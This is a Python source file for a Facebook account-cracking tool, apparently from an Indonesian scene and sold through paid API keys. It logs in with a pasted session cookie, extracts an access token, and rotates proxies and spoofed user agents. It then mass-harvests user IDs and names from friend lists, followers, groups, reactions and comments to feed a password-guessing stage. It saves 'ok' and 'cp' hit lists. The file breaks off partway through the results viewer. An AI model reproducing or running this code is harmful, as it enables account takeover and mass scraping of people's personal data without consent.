###----------[ IMPORT LIBRARY ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
from time import sleep
from platform import platform
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn


try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print("Cukup tau")
prox=open('.prox.txt','r').read().splitlines()

uasm = []

for z in range(100):
	rr = random.randint
	rc = random.choice
	aZ = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	versi = ["4.4.2","7.1.1","7.1.2","8.1.0","10"]
	ugent = f"Mozilla/5.0 (Linux; Android 13; Redfin 64-bit only Build/TP1A.220624.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/534.30"
	if ugent in uasm:pass
	else:uasm.append(ugent)
	ugent2 = f"Mozilla/5.0 (Linux; Android 13; sdk_gphone64_arm64 Build/TPB4.220624.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/534.30"
	if ugent2 in uasm:pass
	else:uasm.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; Android 13; HTC One X10 Build/MRA70K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(66,100))}.{str(rr(3200,3900))}.{str(rr(40,150))} Mobile Safari/537.36"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)
	ugent4 = f"Mozilla/5.0 (Linux; Android 11; benz_hy1920x720 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(66,100))}.0.{str(rr(3356,3900))}.{str(rr(77,160))} Mobile Safari/537.36"
	if ugent4 in uasm:pass
	else:uasm.append(ugent4)
	ugent5 = f"Mozilla/5.0 (Linux; U; Android 12; id-id; Mi 10T Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,250))}.0.{str(rr(4200,4900))}.{str(rr(77,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.{str(rr(1,22))}.1-gn"
	if ugent5 in uasm:pass
	else:uasm.append(ugent5)
	ugent6 = f"Mozilla/5.0 (Linux; U; Android 12; bs-ba; Redmi Note 10S Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(89,150))}.0.{str(rr(4200,4900))}.{str(rr(111,166))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.{str(rr(1,22))}.0-gn"
	if ugent6 in uasm:pass
	else:uasm.append(ugent6)


def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

###----------[ COLOR FOR PRINT ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ COLOR FOR RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ RANDOM COLOR ]---------- ###
bgp = "\x1b[1;91m•\x1b[1;93m•\x1b[1;92m•"

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()
device = platform()
url_mb = "https://mbasic.facebook.com"
header_grup_tanpalogin = {"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
ugent = [
"Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1z",
"Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16",
"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
"NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0",
"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",
"Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405)",
]

###----------[ APPEND AND MORE ]---------- ###
loop = 0
id,id2,ok,cp = [],[],[],[]
mtd_dev = []
opt = []
idz = []
apk = []
files = []
uasm = []

###----------[ TIME ]---------- ###
now = datetime.now()
day = now.day
month = now.month
year = now.year
month_birthday = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
month_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if month < 0 or month > 12:
		exit()
	month_now = month - 1
except ValueError:exit()
_month_ = month_cek[month_now]
my_date = date.today()
day_now = calendar.day_name[my_date.weekday()]
date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))

###----------[ CHECK STATUS SCRIPT ]---------- ###

	
###----------[ CLEAR TERMINAL ]---------- ###
def clear_screen():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

###----------[ DELETE LOGIN ]---------- ###
def delete():
	try:os.remove("data/token.txt")
	except:pass
	try:os.remove("data/cookie.txt")
	except:pass

###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "morning"
	elif 12 <= hours < 15:timenow = "afternoon"
	elif 15 <= hours < 18:timenow = "evening"
	else:timenow = "night"
	return timenow

###----------[ GET DATA APIKEY ]---------- ###
def menu_apikey():
	logo()
	prints(Panel(f"""{P2}
[{B2}01{P2}]. I have apikey and want to enter it
[{B2}02{P2}]. I don't have Apikey and want to buy 
[{B2}03{P2}]. I want to see the results crack
""",width=80,padding=(0,15),style='#00C8FF'))
	api = input(f" {bgp} {N}choose : ")
	if api in["1","01"]:
		prints(Panel(f"""{P2}enter the apikey you have, if not, please buy by selecting number 2""",width=80,style='#00C8FF'))
		key = input(f" {bgp} {N}input apikey : {H}")
		open("data/.apikey.txt","w").write(key)
		menu()
	elif api in["2","02"]:
		os.system("xdg-open https://wa.me/62895384982854?text=assalamualaikum,+bang+saya+mau+beli+lisensi")
		sleep(2);menu_apikey()
	elif api in["3","03"]:
		see_results()
	
###----------[ GET DATA APIKEY ]---------- ###
def data_apikey():
	global device
	try:
		apikey = open("data/.apikey.txt", "r").read()
		url = ses.get(f"https://fall-xavier.my.id/check.php?key={apikey}&dev={device}",headers={"user-agent": "chrome"}).json()
		name = url["nama"];email = url["email"];stat = url["usage"];joined = url["join"];expired = url["expired"];remains = url["readtext"];limitdev = url["limit-device"];devuse = url["status_device"]
		if "kadaluarsa" in url["status"]:
			os.remove("data/.apikey.txt")
			prints(Panel(f"""[bold red]Maaf lisensi anda tidak valid, silahkan hubungi author untuk mendapatkan lisensi dengan cara membelinya"""))
			sleep(3)
			menu_apikey()
		else:
			if "trial" in url["usage"]:
				prints(Panel(f"""{P2}Invalid apikey, please use another apikey or you can buy it""",width=80,style='#00C8FF'))
				sleep(3)
				menu_apikey()
			else:pass
	except (KeyError,IOError):
		prints(Panel(f"""{P2}Invalid apikey, please use another apikey or you can buy it""",width=80,style='#00C8FF'))
		sleep(3)
		menu_apikey()
	except requests.exceptions.ConnectionError:
		prints(Panel(f"""{P2}connection problem, please check your connection again""",width=80,style='#00C8FF'))
		sys.exit()
	prints(Panel(f"""{P2}[{B2}+{P2}] name    : {name}        [{B2}+{P2}] limit device : {limitdev}
[{B2}+{P2}] email   : {email}  [{B2}+{P2}] device used  : {re.findall('pemakain device tersisa (.*?) lagi',devuse)[0]} device
[{B2}+{P2}] joined  : {joined}        [{B2}+{P2}] time remains : {remains.replace("hari lagi","")}day
[{B2}+{P2}] expired : {expired}        [{B2}+{P2}] status key   : {stat}""",width=80,padding=(0,4),style='#00C8FF'))

###----------[ LOGO ]---------- ###
def logo():
	clear_screen()
	prints(Panel(f"""{B2}███████ ██ ███    ███ ██████  ██      ███████  hay, my name reinxou
██      ██ ████  ████ ██   ██ ██      ██       thanks for all user and
███████ ██ ██ ████ ██ ██████  ██      █████    this is version 0.1
     ██ ██ ██  ██  ██ ██      ██      ██       please don't recode :)
███████ ██ ██      ██ ██      ███████ ███████  enjoy the features tools""",style='#00C8FF'))

###----------[ LOGIN ]---------- ###
def login():
	logo()
	prints(Panel(f"""{P2}You have to enter facebook cookies to login. You can see the tutorial here https://youtu.be/GwOMLRPogUo""",width=80,padding=(0,1),style='#00C8FF'))
	cookie = input(f" {bgp} {N}input cookie : {H}")
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("data/token.txt", "w").write(find_token.group(1))
		open("data/cookie.txt", "w").write(cookie)
		print(f"\n {bgp} {N}Token : {H}{find_token.group(1)}{P}")
		sleep(3);menu()
	except Exception as e:
		print(e)
		os.system("rm -f data/token.txt data/cookie.txt")
		prints(Panel(f"""{P2}cookie invalid,please try other cookie and make sure authentication off""",width=80,style='#00C8FF'))
		sys.exit()

###----------[ CONVET LANGUAGE ]---------- ###
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.content,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

###----------[ MAIN MENU ]---------- ###
def menu():
	logo()
	#data_apikey()
	try:
		token = open("data/token.txt","r").read()
		cok = open("data/cookie.txt","r").read()
		cookie = {"cookie":cok}
		language(cookie)
		name = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}",cookies=cookie).json()["name"]
	except (KeyError,IOError):
		delete()
		login()
	logo()
	#data_apikey()
	prints(Panel(f"""{P2}welcome to {K2}{name}{P2}, good {waktu()} and have a nice day.""",width=80,padding=(0,5),style='#00C8FF'))
	prints(Panel(f"""{P2}
[{B2}01{P2}]. crack from search name    [{B2}06{P2}]. crack from group members
[{B2}02{P2}]. crack from public friends [{B2}07{P2}]. crack from public comments
[{B2}03{P2}]. crack from multi target   [{B2}08{P2}]. crack friends from friends
[{B2}04{P2}]. crack from followers      [{B2}09{P2}]. see results from cracks
[{B2}05{P2}]. crack from all reactions  [{B2}10{P2}]. logout (remove cookie)
""",width=80,padding=(0,4),style='#00C8FF'))
	ask = input(f" {bgp} {N}choose : ")
	if ask in["1","01"]:
		search_name()
	elif ask in["2","02"]:
		public_friends(token,cookie)
	elif ask in["3","03"]:
		multi_target(token,cookie)
	elif ask in["4","04"]:
		followers(token,cookie)
	elif ask in["5","05"]:
		all_reactions(cookie)
	elif ask in["6","06"]:
		group_members()
	elif ask in["7","07"]:
		public_comments(cookie)
	elif ask in["8","08"]:
		friendsfromfriends(token,cookie)
	elif ask in["9","09"]:
		see_results()
	elif ask in["10"]:
		delete()
		exit(" success delete login....")
	
###----------[ CONVERT USERNAME TO ID ]---------- ###
def convert_id(user):
	payload = {"fburl": "https://free.facebook.com/{user}", "check": "Lookup"}
	if "facebook" in user:
		payload = {"fburl": user, "check": "Lookup"}
	url = parser(ses.post("https://lookup-id.com/", data=payload).content,"html.parser")
	data = url.find("span", id="code")
	idt = data.text
	return idt

###----------[ DUMP FROM SEARCH NAME ]---------- ###
def search_name():
	prints(Panel(f"""{P2}you must enter a search name. You can use a comma (,) as a separator if you want more than 1 name""",width=80,style='#00C8FF'))
	idt = input(f" {bgp} {N}input name : ").split(",")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c on your keyboard""",width=80,style='#00C8FF'))
	common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	for set3 in idt:
		dump_search(f"https://mbasic.facebook.com/public/{set3}?/locale2=id_ID")
	print("")
	setting_password()

###----------[ GET DATA FROM SEARCH NAME ]---------- ###
def dump_search(link):
	try:
		r = parser(ses.get(str(link)).text,'html.parser')
		for x in r.find_all('td'):
			data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
			for uid,name in data:
				if 'profile.php?' in uid:
					uid = re.findall('id=(.*)',str(uid))[0]
				elif '<span' in name:
					name = re.findall('(.*?)\<',str(name))[0]
				try:
					iso = uid+"<=>"+name
					if iso in id:
						pass
					else:
						id.append(iso)
				except:continue
				sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		if 'Lihat Hasil Selanjutnya' in r.text:
			link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
			dump_search(link)
	except:
		pass

###----------[ DUMP FROM PUBLIC FRIENDS ]---------- ###
def public_friends(token,cookie):
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style='#00C8FF'))
	user = input(f" {bgp} {N}input target id : ")
	if(re.findall("\w+",user)):
		try:idt = convert_id(user)
		except:idt = user
	try:
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except KeyError:exit("\n  [!] akun tidak tersedia atau list teman private")
	print("")
	setting_password()
	
###----------[ DUMP FROM MULTI TARGET ]---------- ###
def multi_target(token,cookie):
	prints(Panel(f"""{P2}input the number of target id, if you want 1 you just enter""",width=80,style='#00C8FF'))
	try:tanya_total = int(input(f" {bgp} {N}input total target : "))
	except:tanya_total=1
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style='#00C8FF'))
	for t in range(tanya_total):
		t +=1
		print("")
		user = input(f" {bgp} {N}input target id {O}{t}{N} : ")
		if(re.findall("\w+",user)):
			try:idt = convert_id(user)
			except:idt = user
		try:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				try:
					uid = i['id']+'<=>'+i['name']
					if uid in id:pass
					else:id.append(uid)
				except:continue
				sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		except KeyError:print("  [!] akun tidak tersedia atau list teman private")
	print("")
	setting_password()
	
###----------[ DUMP FROM FOLLOWERS ]---------- ###
def followers(token,cookie):
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your followers",width=80,style='#00C8FF'))
	user = input(f" {bgp} {N}input target id : ")
	if(re.findall("\w+",user)):
		try:idt = convert_id(user)
		except:idt = user
	try:
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["subscribers"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except KeyError:exit("\n  [!] akun tidak tersedia atau list teman private")
	print("")
	setting_password()
			
###----------[ DUMP FROM REACTIONS ]---------- ###
def all_reactions(cookie):
	global react_type
	prints(Panel(f"""{P2}
[{B2}01{P2}]. crack from all reactions  [{B2}05{P2}]. crack from haha reactions
[{B2}02{P2}]. crack from like reactions [{B2}06{P2}]. crack from wow reactions
[{B2}03{P2}]. crack from love reactions [{B2}07{P2}]. crack from sad reactions
[{B2}04{P2}]. crack from angry reactions[{B2}08{P2}]. crack from care reactions
""",width=80,padding=(0,4),style='#00C8FF'))
	react = input(f" {bgp} {N}choose react : ")
	if react in["01","1"]:
		react_type="0"
	elif react in["02","2"]:
		react_type="1"
	elif react in["03","3"]:
		react_type="2"
	elif react in["04","4"]:
		react_type="8"
	elif react in["05","5"]:
		react_type="4"
	elif react in["06","6"]:
		react_type="3"
	elif react in["07","7"]:
		react_type="7"
	elif react in["08","8"]:
		react_type="16"
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style='#00C8FF'))
	idt = input(f" {bgp} {N}input id post : ")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c on your keyboard""",width=80,style='#00C8FF'))
	url = "https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier="+idt
	dump_react(url,cookie)
	print("")
	setting_password()

###----------[ GET DATA FROM REACTIONS ]---------- ###
def dump_react(url,cookie):
	data = parser(ses.get(url,cookies=cookie,headers=header_grup).text.encode("utf-8"),"html.parser")
	try: 
		for isi in data.find_all('h3'):
			for ids in isi.find_all('a',href=True):
				try:
					if "profile.php" in ids.get("href"):
						uid = ids.get("href").split('=')[1]
						nama = ids.text
						id.append(uid+"<=>"+nama)
					else:
						uid = ids.get("href").split('/')[1]
						nama = ids.text
						id.append(uid+"<=>"+nama)
					sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
				except:continue
		for lanjut in data.find_all("a",href=True):
			if "Lihat Selengkapnya" in lanjut.text:
				while True:
					try:
						dump_react("https://mbasic.facebook.com/"+lanjut.get("href").replace('reaction_type=0','reaction_type='+react_type),cookie)
						break
					except:
						pass
	except:
		pass

###----------[ DUMP FROM GROUP MEMBERS ]---------- ###
def group_members():
	prints(Panel(f"""{P2}make sure the group id is public or not private. if private will return empty result""",width=80,style='#00c8ff'))
	idt = input(f" {bgp} {N}input id group : ")
	url = "https://mbasic.facebook.com/groups/"+idt
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c on your keyboard""",width=80,style='#00C8FF'))
	get_datagrup(url)
	print("")
	setting_password()

###----------[ GET DATA FROM GROUP MEMBERS ]---------- ###
def get_datagrup(url):
	try:
		data = parser(ses.get(url, headers=header_grup_tanpalogin).text, "html.parser")
		for cari in data.find_all('table'):
			liatnih = cari.text
			spl = liatnih.split(' ')
			if 'mengajukan' in spl:
				idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
				idyou =	idsiapa[0].replace('content_owner_id_new.','')
				namayou = liatnih.replace(' mengajukan pertanyaan .','')
				idku = idyou+'<=>'+namayou				
				if idku in id:continue
				else:
					id.append(idku)
					sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			elif '>' in spl:
				idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
				idyou =	idsiapa[0].replace('content_owner_id_new.','')
				namayou = liatnih.split(' > ')[0]
				idku = idyou+'<=>'+namayou
				if idku in id:
					continue
				else:
					id.append(idku)
					sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
			else:
				continue
		for g in data.find_all('a'):
			css = str(g).split('>')
			if 'Lihat Postingan Lainnya</span' in css:
				bcj = str(g).replace('<a href="','').replace('amp;','')
				bcj2 = bcj.split(' ')[0].replace('"><img','')
				get_datagrup('https://mbasic.facebook.com'+bcj2)
	except:
		pass

###----------[ DUMP FROM GROUP MEMBERS ]---------- ###
def public_comments(cookie):
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style='#00C8FF'))
	idg = input(f" {bgp} {N}input id post : ")
	url = "https://mbasic.facebook.com/"+idg
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c on your keyboard""",width=80,style='#00C8FF'))
	get_datacomments(url,cookie)
	print("")
	setting_password()
	
def get_datacomments(url,cookie):
	urlmain = ses.get(url,cookies=cookie).text.encode("utf-8")
	par = parser(urlmain,'html.parser')
	try:
		for xf in par.find_all('h3'):
			for xx in xf.find_all('a',href=True):
				try:
					if "profile.php" in xx.get("href"):
						z = xx.get("href").split('=')[1]
						x = z.split('&')[0]
						uid = xx.text
						id.append(x+"<=>"+uid)
						sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
				except:pass
		for n in par.find_all("a",href=True):
			if "Lihat komentar lainnya" in n.text:
				get_datacomments("https://mbasic.facebook.com/"+n.get("href"),cookie)
	except:
		pass

def friendsfromfriends(token,cookie):
	prints(Panel(f"""{P2}
[{B2}01{P2}]. dump friends from friends for id new
[{B2}02{P2}]. dump friends from friends for id old
[{B2}03{P2}]. dump friends from friends for id random
""",width=80,padding=(0,14),style='#00C8FF'))
	pil = input(f" {bgp} {N}choose : ")
	if pil in["1","01"]:
		prints(Panel(f"""{P2}newinput the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style='#00C8FF'))
		idt = input(f" {bgp} {N}input target id : ")
		url = (f"https://graph.facebook.com/{idt}?fields=friends.fields(id,name)&access_token={token}")
		get_id_new(url,token,cookie,True)
		print("")
		setting_password()
	elif pil in["2","02"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style='#00C8FF'))
		idt = input(f" {bgp} {N}input target id : ")
		url = (f"https://graph.facebook.com/{idt}?fields=friends.fields(id,name)&access_token={token}")
		get_id_old(url,token,cookie,True)
		print("")
		setting_password()
	elif pil in["3","03"]:
		prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style='#00C8FF'))
		idt = input(f" {bgp} {N}input target id : ")
		url = (f"https://graph.facebook.com/{idt}?fields=friends.fields(id,name)&access_token={token}")
		get_id_random(url,token,cookie,True)
		print("")
		setting_password()
		
def get_id_old(url,token,cookie,stat):
	id1, id2 = [], []
	id3, id4 = [], []
	try:
		if stat == True:
			for i in ses.get(url,cookies=cookie).json()["friends"]["data"]:
				if len(i["id"])==5 or len(i["id"])==6 or len(i["id"])==7 or len(i["id"])==8 or len(i["id"])==9 or len(i["id"])==10:
					id1.append(i["id"]+"<=>"+i["name"])
				elif i["id"][:10] in ["1000000000"]:
					id1.append(i["id"]+"<=>"+i["name"])
				elif i["id"][:9] in ["100000000"]:
					id1.append(i["id"]+"<=>"+i["name"])
			for zz in id1:
				id2.append(zz)
				if len(id2) == 100:break
			for zzz in id2:
				uid = zzz.split('<=>')[0]
				url = (f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name)&access_token={token}")
				get_id_old(url,token,cookie,False)
		else:
			for a in ses.get(url,cookies=cookie).json()['friends']['data']:
				if len(a["id"])==5 or len(a["id"])==6 or len(a["id"])==7 or len(a["id"])==8 or len(a["id"])==9 or len(a["id"])==10:
					id3.append(a["id"]+"<=>"+a["name"])
			for b in id3:
				id4.append(b)
				if len(id4) == 100:break
			for iso in id4:
				if "'friends'" in iso:
					pass
				if iso in id:
					pass
				else:
					id.append(iso)
					print(iso)
					#sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except:
		pass
	
def get_id_new(url,token,cookie,stat):
	id1, id2, id3 = [], [], []
	id4, id5, id6 = [], [], []
	try:
		if stat == True:
			for i in ses.get(url,cookies=cookie).json()["friends"]["data"]:
				id1.append(i["id"]+"<=>"+i["name"])
			for y in id1:
				id2.insert(0,y)
			for zz in id2:
				id3.append(zz)
				if len(id3) == 100:break
			for zzz in id3:
				uid = zzz.split('<=>')[0]
				url = (f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name)&access_token={token}")
				get_id_old(url,token,cookie,False)
		else:
			for a in ses.get(url,cookies=cookie).json()['friends']['data']:
				id4.append(a["id"]+"<=>"+a["name"])
			for b in id4:
				id5.insert(0,b)
			for c in id5:
				id6.append(c)
				if len(id6) == 100:break
			for iso in id6:
				if "'friends'" in iso:
					pass
				if iso in id:
					pass
				else:
					id.append(iso)
					print(iso)
					#sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except:
		pass
		
def get_id_random(url,token,cookie,stat):
	id1, id2 = [], []
	id3, id4 = [], []
	try:
		if stat == True:
			for i in ses.get(url,cookies=cookie).json()["friends"]["data"]:
				id1.append(i["id"]+"<=>"+i["name"])
			for zz in id1:
				id2.append(zz)
				if len(id2) == 100:break
			for zzz in id2:
				uid = zzz.split('<=>')[0]
				url = (f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name)&access_token={token}")
				get_id_old(url,token,cookie,False)
		else:
			for a in ses.get(url,cookies=cookie).json()['friends']['data']:
				id3.append(a["id"]+"<=>"+a["name"])
			for b in id3:
				xx = random.randint(0,len(id4))
				id4.insert(xx,b)
				if len(id4) == 100:break
			for iso in id4:
				if "'friends'" in iso:
					pass
				if iso in id:
					pass
				else:
					id.append(iso)
					print(iso)
					#sys.stdout.write(f"\r {bgp} {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except:
		pass

def see_results():
	prints(Panel(f"""{P2}
[{B2}01{P2}]. see results crack account ok
[{B2}02{P2}]. see results crack account cp
""",width=80,padding=(0,19),style='#00C8FF'))
	res = input(f" {bgp} {N}choose : ")
	if res in["1","01"]:
		dirs = os.listdir("OK")
		prints(Panel(f"""{P2} already found {len(dirs)} file results crack ok""",width=80,padding=(0,15),style='#00C8FF'))
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			print(f"  [{num}] {file}")
		prints(Panel(f"""{P2} you only need to choose a number from the file crack above this""",width=80,style='#00C8FF'))
		bngst = input(f" {bgp} {N}choose : ")
		try:
			kontol = files[int(bngst)-1]
			totalok = open("OK/%s"%(kontol)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(kontol))
		nm_file = ("%s"%(kontol)).replace("-", " ")
